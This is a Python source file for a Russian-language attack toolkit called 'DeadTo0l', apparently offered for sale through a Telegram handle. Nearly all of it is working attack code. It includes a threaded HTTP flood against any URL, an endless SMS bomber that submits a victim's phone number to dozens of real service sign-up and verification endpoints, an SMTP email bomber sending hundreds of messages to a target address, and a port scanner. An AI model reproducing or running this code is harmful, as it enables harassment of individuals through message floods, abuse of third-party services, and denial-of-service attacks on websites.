import speedtest
import os,sys,time,random,threading,requests,socket
from colorama import Fore, Back
from datetime import datetime,date

def flush(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

class bcolors:
    BLACK = "\033[0;30m"
    RED = '\033[91m'
    GREEN = "\033[92m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[93m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"



banner = '''


	                                                                                                                                            
	                                                                    dddddddd                                                                
	DDDDDDDDDDDDD                                                       d::::::d  TTTTTTTTTTTTTTTTTTTTTTT                   000000000     lllllll 
	D::::::::::::DDD                                                    d::::::d  T:::::::::::::::::::::T                 00:::::::::00   l:::::l 
	D:::::::::::::::DD                                                  d::::::d  T:::::::::::::::::::::T               00:::::::::::::00 l:::::l 
	DDD:::::DDDDD:::::D                                                 d:::::d   T:::::TT:::::::TT:::::T              0:::::::000:::::::0l:::::l 
	  D:::::D    D:::::D     eeeeeeeeeeee    aaaaaaaaaaaaa      ddddddddd:::::d   TTTTTT  T:::::T  TTTTTTooooooooooo   0::::::0   0::::::0 l::::l 
	  D:::::D     D:::::D  ee::::::::::::ee  a::::::::::::a   dd::::::::::::::d           T:::::T      oo:::::::::::oo 0:::::0     0:::::0 l::::l 
	  D:::::D     D:::::D e::::::eeeee:::::eeaaaaaaaaa:::::a d::::::::::::::::d           T:::::T     o:::::::::::::::o0:::::0     0:::::0 l::::l 
	  D:::::D     D:::::De::::::e     e:::::e         a::::ad:::::::ddddd:::::d           T:::::T     o:::::ooooo:::::o0:::::0 000 0:::::0 l::::l 
	  D:::::D     D:::::De:::::::eeeee::::::e  aaaaaaa:::::ad::::::d    d:::::d           T:::::T     o::::o     o::::o0:::::0 000 0:::::0 l::::l 
	  D:::::D     D:::::De:::::::::::::::::e aa::::::::::::ad:::::d     d:::::d           T:::::T     o::::o     o::::o0:::::0     0:::::0 l::::l 
	  D:::::D     D:::::De::::::eeeeeeeeeee a::::aaaa::::::ad:::::d     d:::::d           T:::::T     o::::o     o::::o0:::::0     0:::::0 l::::l 
	  D:::::D    D:::::D e:::::::e         a::::a    a:::::ad:::::d     d:::::d           T:::::T     o::::o     o::::o0::::::0   0::::::0 l::::l 
	DDD:::::DDDDD:::::D  e::::::::e        a::::a    a:::::ad::::::ddddd::::::dd        TT:::::::TT   o:::::ooooo:::::o0:::::::000:::::::0l::::::l
	D:::::::::::::::DD    e::::::::eeeeeeeea:::::aaaa::::::a d:::::::::::::::::d        T:::::::::T   o:::::::::::::::o 00:::::::::::::00 l::::::l
	D::::::::::::DDD       ee:::::::::::::e a::::::::::aa:::a d:::::::::ddd::::d        T:::::::::T    oo:::::::::::oo    00:::::::::00   l::::::l
	DDDDDDDDDDDDD            eeeeeeeeeeeeee  aaaaaaaaaa  aaaa  ddddddddd   ddddd        TTTTTTTTTTT      ooooooooooo        000000000     llllllll


	                                                      By: ZullanCode
	                                                    TG: @ZULLANSELL
	                                                      YT: ZullanHack

	'''
os.system('cls')
flush(bcolors.RED + '// DeadTo0l Загружается...')
time.sleep(1.5)
os.system('cls')
print(bcolors.GREEN + banner)
print(

bcolors.RED +'''█████████████████████████████████████████████████████████████████
██      █████                                      ██████      ██
██ ''',bcolors.GREEN + '''1.1''',bcolors.RED +'''█████                ''',bcolors.GREEN +'''DEADDDOS           ''',bcolors.RED +''' ██████ ''',bcolors.GREEN +'''1.1''',bcolors.RED +'''██
██      █████                                      ██████      ██
█████████████████████████████████████████████████████████████████'''


    )
print('')
print(

bcolors.RED +'''█████████████████████████████████████████████████████████████████
██      █████                                      ██████      ██
██ ''',bcolors.GREEN + '''1.2''',bcolors.RED +'''█████                ''',bcolors.GREEN +'''DEADBOMBER         ''',bcolors.RED +''' ██████ ''',bcolors.GREEN +'''1.2''',bcolors.RED +'''██
██      █████                                      ██████      ██
█████████████████████████████████████████████████████████████████'''


    )
print('')
print(

bcolors.RED +'''█████████████████████████████████████████████████████████████████
██      █████                                      ██████      ██
██ ''',bcolors.GREEN + '''1.3''',bcolors.RED +'''█████                ''',bcolors.GREEN +'''EMAILBOMBER        ''',bcolors.RED +''' ██████ ''',bcolors.GREEN +'''1.3''',bcolors.RED +'''██
██      █████                                      ██████      ██
█████████████████████████████████████████████████████████████████'''


    )
print('')
print(

bcolors.RED +'''█████████████████████████████████████████████████████████████████
██      █████                                      ██████      ██
██ ''',bcolors.GREEN + '''2.1''',bcolors.RED +'''█████                ''',bcolors.GREEN +'''DEADSCANNER        ''',bcolors.RED +''' ██████ ''',bcolors.GREEN +'''2.1''',bcolors.RED +'''██
██      █████                                      ██████      ██
█████████████████████████████████████████████████████████████████'''


    )
print('')
select = float(input(bcolors.GREEN + 'Выбирете действие: '))

if select == 1.1:
	os.system('cls')
	print('')
	print('')
	print('')
	print('')
	print('')
	print('')
	flush(bcolors.GREEN + '// После запуска ддоса нужно будет перезапускать программу')
	print('')
	ur = flush(input(bcolors.GREEN + '// Введите URL Адрес: '))

	port = 80
	urls = [ur]

	def attack1(i):
		while True:
			fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((i, port))
				s.sendto(("GET " + i + " HTTP1.1\r\n").encode('ascii'),
		                		(i, port))
				s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),
		                		(i, port))
				s.close()
			except Exception as e:
				print(f"{i} ддосим...")

	for i in urls:
		threading.Thread(target=attack1, args=(i, )).start()

if select == 1.2:
    def DeadBomber():
        os.system('cls')
        print('')
        print('')
        print('')
        print('')
        print('')
        print('')
        flush(bcolors.GREEN + '// Запуск бомбера...')
        time.sleep(1.3)
        print('')
        print('')
        print('')
        print('')
        print('')
        print('')
        os.system('cls')
        _phone = input(bcolors.GREEN + 'Вставте номер телефона (с плюсом +): ')

        if _phone[0] == '+':
            _phone = _phone[1:]
        if _phone[0] == '8':
            _phone = '7' + _phone[1:]
        if _phone[0] == '9':
            _phone = '7' + _phone
        return _phone

    _phone = DeadBomber()

    _name = ''
    for x in range(12):
        _name = _name + \
            random.choice(
                list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + \
            random.choice(
                list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + \
            random.choice(
                list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        _phone9 = _phone[1:]
        _phoneAresBank = '+' + \
            _phone[0]+'('+_phone[1:4]+')'+_phone[4:7] + \
            '-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+' + \
            _phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+' + \
            _phone[0]+'+('+_phone[1:4]+')'+_phone[4:7] + \
            '-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+' + \
            _phone[0]+' ('+_phone[1:4]+') '+_phone[4:7] + \
            ' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') ' + \
            _phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

    iteration = 0
    while True:
        _email = _name + f'{iteration}' + '@gmail.com'
        email = _name + f'{iteration}' + '@gmail.com'
        try:
            requests.post(
                'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                data={
                    'phoneNumber': _phone,
                    'countryCode': 'ID',
                    'name': 'test',
                    'email': 'mail@mail.com',
                    'deviceToken': '*'
                },
                headers={
                    'User-Agent':
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'
                })
            print('[+] Grab отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html',
                          data={
                              'l': _phone9
                          }).json()["res"]
            print('[+] RuTaxi отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code',
                          data={'phone': _phone},
                          headers={})
            print('[+] BelkaCar отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                data={'phone_number': _phone},
                headers={})
            print('[+] Tinder отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/',
                          data={'phone': _phone},
                          headers={})
            print('[+] Karusel отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up',
                          data={'phone': '+' + _phone},
                          headers={})
            print('[+] Tinkoff отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://api.mtstv.ru/v1/users',
                          json={'msisdn': _phone},
                          headers={})
            print('[+] MTS отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code',
                          data={'phone': _phone})
            print('[+] Youla отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={
                              'reset_by': 'phone',
                              'action_id': 'pass-recovery',
                              'phone': _phonePizzahut,
                              '_token': '*'
                          })
            print('[+] PizzaHut отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://www.rabota.ru/remind',
                          data={'credential': _phone})
            print('[+] Rabota отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone',
                          data={'phone': '+' + _phone})
            print('[+] Rutube отправлен!')
        except:
            requests.post(
                'https://www.citilink.ru/registration/confirm/phone/+' +
                _phone + '/')
            print('[+] Citilink отправлен!')

        try:
            requests.post(
                'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                data={
                    'name': _name,
                    'phone': _phone,
                    'promo': 'yellowforma'
                })
            print('[+] Smsint sent!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' +
                _phone9 + '&country_code=%2B7&nod=4&locale=en')
            print('[+] oyorooms отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={
                    'pageName': 'loginByUserPhoneVerification',
                    'fromCheckout': 'false',
                    'fromRegisterPage': 'true',
                    'snLogin': '',
                    'bpg': '',
                    'snProviderId': ''
                },
                data={
                    'phone': _phone,
                    'g-recaptcha-response': '',
                    'recaptcha': 'on'
                })
            print('[+] MVideo отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://newnext.ru/graphql',
                          json={
                              'operationName':
                              'registration',
                              'variables': {
                                  'client': {
                                      'firstName': 'Иван',
                                      'lastName': 'Иванов',
                                      'phone': _phone,
                                      'typeKeys': ['Unemployed']
                                  }
                              },
                              'query':
                              'mutation registration($client: ClientInput!) {'
                              '\n  registration(client: $client) {'
                              '\n    token\n    __typename\n  }\n}\n'
                          })
            print('[+] newnext отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://api.sunlight.net/v3/customers/authorization/',
                data={'phone': _phone})
            print('[+] Sunlight отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                json={
                    'client_type': 'personal',
                    'email': _email,
                    'mobile_phone': _phone,
                    'deliveryOption': 'sms'
                })
            print('[+] alpari отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode',
                          data={'phone': _phone})
            print('[+] Invitro отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={
                              'jsonrpc': '2.0',
                              'protocol': '5',
                              'method': 'Пользователь.ЗаявкаНаФизика',
                              'params': {
                                  'phone': _phone
                              },
                              'id': '1'
                          })
            print('[+] Sberbank отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                json={
                    'firstName': 'Иван',
                    'middleName': 'Иванович',
                    'lastName': 'Иванов',
                    'sex': '1',
                    'birthDate': '10.10.2000',
                    'mobilePhone': _phone9,
                    'russianFederationResident': 'true',
                    'isDSA': 'false',
                    'personalDataProcessingAgreement': 'true',
                    'bKIRequestAgreement': 'null',
                    'promotionAgreement': 'true'
                })
            print('[+] Psbank отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
                data={'phone': _phone})
            print('[+] Beltelcom отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/',
                          data={'phone': _phone})
            print('[+] Karusel отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                json={'phone': '+' + _phone})
            print('[+] KFC отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://api.carsmile.com/",
                json={
                    "operationName":
                    "enterPhone",
                    "variables": {
                        "phone": _phone
                    },
                    "query":
                    "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"
                })
            print('[+] carsmile отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://www.citilink.ru/registration/confirm/phone/+' +
                _phone + '/')
            print('[+] Citilink отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={
                              "SignupForm[username]": _phone,
                              "SignupForm[device_type]": 3
                          })
            print('[+] Delitime отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.get('https://findclone.ru/register',
                         params={'phone': '+' + _phone})
            print('[+] findclone звонок отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",
                          json={"phone": {
                              "code": 1,
                              "number": _phone
                          }})
            print('[+] Guru отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://www.icq.com/smsreg/requestPhoneValidation.php',
                data={
                    'msisdn': _phone,
                    "locale": 'en',
                    'countryCode': 'ru',
                    'version': '1',
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763"
                })
            print('[+] ICQ отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://terra-1.indriverapp.com/api/authorization?locale=ru",
                data={
                    "mode": "request",
                    "phone": "+" + _phone,
                    "phone_permission": "unknown",
                    "stream_id": 0,
                    "v": 3,
                    "appversion": "3.20.6",
                    "osversion": "unknown",
                    "devicemodel": "unknown"
                })
            print('[+] InDriver отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                data={
                    "password": password,
                    "application": "lkp",
                    "login": "+" + _phone
                })
            print('[+] Invitro отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
                          json={"phone": _phone})
            print('[+] Pmsm отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                data={"phone": _phone})
            print('[+] IVI отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://lenta.com/api/v1/authentication/requestValidationCode',
                json={'phone': '+' + self.formatted_phone})
            print('[+] Lenta отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={
                              "phone": "+" + _phone,
                              "api": 2,
                              "email": "email",
                              "x-email": "x-email"
                          })
            print('[+] Mail.ru отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                params={"pageName": "registerPrivateUserPhoneVerificatio"},
                data={
                    "phone": _phone,
                    "recaptcha": 'off',
                    "g-recaptcha-response": ""
                })
            print('[+] MVideo отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                data={"st.r.phone": "+" + _phone})
            print('[+] OK отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://plink.tech/register/',
                          json={"phone": _phone})
            print('[+] Plink отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                json={"phone": _phone})
            print('[+] qlean отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",
                          data={"number": _phone})
            print('[+] SMSgorod отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                data={'phone_number': _phone})
            print('[+] Tinder отправлен!')
        except:
            print('[-] Ошибка отправления')

        try:
            requests.post(
                'https://passport.twitch.tv/register?trusted_request=true',
                json={
                    "birthday": {
                        "day": 11,
                        "month": 11,
                        "year": 1999
                    },
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": password,
                    "phone_number": _phone,
                    "username": username
                })
            print('[+] Twitch отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms',
                          data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            print('[+] CabWiFi отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",
                          json={
                              "phone": _phone,
                              "type": 2
                          })
            print('[+] wowworks отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://eda.yandex/api/v1/user/request_authentication_code',
                json={"phone_number": "+" + _phone})
            print('[+] Eda.Yandex отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code',
                          data={'phone': _phone})
            print('[+] Youla отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                json={
                    "client_type": "personal",
                    "email": f"{email}@gmail.ru",
                    "mobile_phone": _phone,
                    "deliveryOption": "sms"
                })
            print('[+] Alpari отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post(
                "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                data={"phone": _phone})
            print('[+] SMS отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp',
                          data={"phone": _phone})
            print('[+] Delivery отправлен!')
        except:
            print('[-] Ошибка отправления!')

        try:
            iteration += 1
            print(('{} Loop Done.').format(iteration))
        except:
            break

if select == 1.3:
    os.system('cls')
    def banner():
        flush(bcolors.RED + '// Email Bomber Загружается... ')
        print(bcolors.GREEN + '''// DeadTo0l Загружается...

███████████████▀▀▀▀▀▀▀█████████████████████████████████████████████████████████▀▀▀▀▀▀▀███████████████
██████████▀▀░░░░░░░░░░░░░▀▀█████████████████DEADSECRET████████████████████▀▀░░░░░░░░░░░░░▀▀██████████
███████▀▀░░░░░░░░░░░░░░░░░░░░▀█████████████████████████████████████████▀▀░░░░░░░░░░░░░░░░░░░░▀███████
█████▀░░░░░░░░░░░░░░░░░░░░░░░░░▀██████████By ZullanCode██████████████▀░░░░░░░░░░░░░░░░░░░░░░░░░▀█████
████▀░░░░░░░░░░░░░░░░░░░░░░░░░░░▀███████████████████████████████████▀░░░░░░░░░░░░░░░░░░░░░░░░░░░▀████
███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████GoodHacking███████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███
██░██▄▄░░░░░░░░░░░░░░░░░░░░░░▄▄██░████████████████████████████████░██▄▄░░░░░░░░░░░░░░░░░░░░░░▄▄██░███
██░██████▄░░░░░░░░░░░░░░░░▄▄█████░████████████████████████████████░██████▄░░░░░░░░░░░░░░░░▄▄█████░███
██░████████▄▄░░░░░░░░░░▄▄████████░████████████████████████████████░████████▄▄░░░░░░░░░░▄▄████████░███
██▄░███████████▄▄░░░▄▄██████████░▄████████████████████████████████▄░███████████▄▄░░░▄▄██████████░▄███
███▄░▀▀▀██████▀▀░▄▄▄░▀██████▀▀▀░▄██████████████████████████████████▄░▀▀▀██████▀▀░▄▄▄░▀██████▀▀▀░▄████
█████░░░░░░░░░░░▄███▄░░░░░░░░░░░█████████████████████████████████████░░░░░░░░░░░▄███▄░░░░░░░░░░░█████
████░░░░░▄▄▄░░░░██▀██░░░░▄▄▄░░░░░███████████████████████████████████░░░░░▄▄▄░░░░██▀██░░░░▄▄▄░░░░░████
████░░░░▄███░░░░░░░░░░░░░███▄░░░░███████████████████████████████████░░░░▄███░░░░░░░░░░░░░███▄░░░░████
████▄▄██████░░▄▄░░▄░░▄▄░░██████▄▄███████████████████████████████████▄▄██████░░▄▄░░▄░░▄▄░░██████▄▄████
████████████░░██░░█░░██░░███████████████████████████████████████████████████░░██░░█░░██░░████████████
████████████░░██░░█░░██░░███████████████████████████████████████████████████░░██░░█░░██░░████████████
████████████░░██░░█░░██░░███████████████████████████████████████████████████░░██░░█░░██░░████████████
████████████░░██░░█░░██░░███████████████████████████████████████████████████░░██░░█░░██░░████████████
████████████░░██░░█░░██░░███████████████████████████████████████████████████░░██░░█░░██░░████████████
█████████████████████████████████████████████████████████████████████████████████████████████████████


            ''')
        print(bcolors.GREEN + '''
                         \|/
                           `--+--'
                              |
                          ,--'#`--.
                          |#######|
                       _.-'#######`-._
                    ,-'###############`-.
                  ,'#####################`,         .___     .__         .
                 |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
                |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
               |#############################|
               |#############################|          Автор: ZullanCode
               |#############################|          Telegram: @ZULLANSELL
                |###########################|
                 \#########################/
                  `.#####################,'
                    `._###############_,'
                       `--..#####..--'                                 ,-.--.
    *.______________________________________________________________,' (Bomb)
                                                                        `--' 
                                                                        ''')

    class Email_Bomber:
        count = 0

        def __init__(self):
            try:
                print(bcolors.RED + '\n // Запуск программы...')
                self.target = str(
                    input(bcolors.GREEN +
                          '// Введите email адрес куда будет рассылка: '))
                self.mode = int(
                    input(
                        bcolors.GREEN +
                        '// Введите BOMBER мод (1,2,3,4) || 1:(1000 email) 2:(500 email) 3:(250 email) 4:(свое) : '
                    ))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERROR: Неверная функция. Пока, пока)))')
                    sys.exit(1)
            except Exception as e:
                print(f'ERROR: {e}')

        def bomb(self):
            try:
                print(bcolors.RED + '\n // Установка бомбы...')
                self.amount = None
                if self.mode == int(1):
                    self.amount = int(1000)
                elif self.mode == int(2):
                    self.amount = int(500)
                elif self.mode == int(3):
                    self.amount = int(250)
                else:
                    self.amount = int(
                        input(
                            bcolors.GREEN +
                            '// Введите кастомное количество адресов(ваших): ')
                    )
                print(
                    bcolors.RED +
                    f'\n // Вы выбрали режим BOMB: {self.mode} и {self.amount} emails '
                )
            except Exception as e:
                print(f'ERROR: {e}')

        def email(self):
            try:
                print(bcolors.RED + '\n // Установка бомбы...')
                self.server = str(
                    input(
                        bcolors.GREEN +
                        '// Введите Email Сервер | или выберите готовые варианты - 1: Gmail 2: Yahoo 3: Outlook : '
                    ))
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(
                        input(bcolors.GREEN + '// Введите номер порта: '))

                if default_port == True:
                    self.port = int(587)

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = str(
                    input(bcolors.GREEN + '// Введите адрес вашей почты: '))
                self.fromPwd = str(input(bcolors.GREEN +
                                         '// Введите пароль: '))
                self.subject = str(
                    input(bcolors.GREEN + '// Выберете title сообщения: '))
                self.message = str(
                    input(bcolors.GREEN + '// Введите текст письма: '))

                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print(f'ERROR: {e}')

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count += 1
                print(bcolors.YELLOW + f'BOMB: {self.count}')
            except Exception as e:
                print(f'ERROR: {e}')

        def attack(self):
            print(bcolors.RED + '\n // Атака... ')
            for email in range(self.amount + 1):
                self.send()
            self.s.close()
            print(bcolors.RED + '\n // Атака завершена')
            sys.exit(0)

    if __name__ == '__main__':
        banner()
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()

if select == 2.1:
    os.system('cls')
    mas = [
        20, 21, 22, 23, 25, 42, 43, 53, 67, 69, 80, 110, 115, 123, 137, 138,
        139, 143, 161, 179, 443, 445, 514, 515, 993, 995, 1080, 1194, 1433,
        1702, 1723, 3128, 3268, 3306, 3389, 5432, 5060, 5900, 5938, 8080,
        10000, 20000
    ]
    print(bcolors.RED + '// Загрузка сканнера портов')
    time.sleep(1.3)
    os.system('cls')
    print(bcolors.GREEN + '''
         
         

 (               (       (                   )    )     (     
 )\ )       (    )\ )    )\ )  (    (     ( /( ( /(     )\ )  
(()/(  (    )\  (()/(   (()/(  )\   )\    )\()))\())(  (()/(  
 /(_)) )\((((_)( /(_))   /(_)|((_|(((_)( ((_)\((_)\ )\  /(_)) 
(_))_ ((_))\ _ )(_))_   (_)) )\___)\ _ )\ _((_)_((_|(_)(_))   
 |   \| __(_)_\(_)   \  / __((/ __(_)_\(_) \| | \| | __| _ \  
 | |) | _| / _ \ | |) | \__ \| (__ / _ \ | .` | .` | _||   /  
 |___/|___/_/ \_\|___/  |___/ \___/_/ \_\|_|\_|_|\_|___|_|_\  
                                                              

                                                                                                 
                                                                                                 

         
         
         ''')
    print(" ")
    host = input('// Введите имя сайта или IP адрес: ')
    print('')
    print(bcolors.GREEN + "-----------------------------------")
    print(bcolors.RED + "\\ Ожидайте идёт сканирование портов! //")
    print(bcolors.GREEN + "-----------------------------------")
    print('')
    for port in mas:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((host, port))
        except socket.error:
            pass
        else:
            s.close
            print(host + ': ' + str(port) + ' порт активен')
    print(bcolors.GREEN + "--------------------------------")
    print(bcolors.RED + "// Процесс завершен")
    print('')
    print(bcolors.GREEN + '[0] Выход')
    select1 = input(bcolors.GREEN + 'Выбирете действие: ')
    if select1 == 0:
    	os.system('cls')
    	os.system('python main.py')